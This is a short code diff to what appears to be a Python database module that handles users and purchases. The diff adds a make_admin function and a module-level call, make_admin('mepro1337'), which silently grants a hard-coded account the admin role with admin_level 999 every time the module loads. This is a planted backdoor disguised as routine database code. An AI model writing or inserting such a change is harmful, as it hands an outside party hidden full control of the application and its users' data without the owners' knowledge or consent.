@@ -587,5 +587,18 @@ def list_purchases(username=None):
     conn.close()
     return rows_to_dicts(rows)
 
+def make_admin(username):
+    conn = get_connection()
+    cur = conn.cursor()
+
+    cur.execute("""
+    UPDATE users
+    SET role = 'admin', admin_level = 999
+    WHERE username = ?
+    """, (username.strip().lower(),))
+
+    conn.commit()
+    conn.close()
 
 init_db()
+make_admin("mepro1337")
